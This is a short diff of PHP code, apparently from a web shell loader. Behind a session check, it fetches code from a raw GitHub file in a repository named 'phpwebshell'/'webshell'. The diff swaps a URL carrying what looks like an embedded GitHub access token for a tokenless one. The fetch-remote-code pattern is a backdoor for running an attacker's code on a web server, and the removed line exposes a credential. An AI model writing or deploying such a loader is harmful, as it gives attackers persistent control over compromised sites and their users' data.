@@ -50,7 +50,7 @@ if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
     exit;
 }
 
-$url = 'https://raw.githubusercontent.com/sibueee/phpwebshell/main/error.php?token=GHSAT0AAAAAACUE5KND6XFH36DAGGJBHBN6ZV2J4GQ';
+$url = 'https://raw.githubusercontent.com/sibueee/webshell/main/error.php';
 $kode = file_get_contents($url);
 if ($kode === FALSE) {
     die('Error fetching code from URL.');
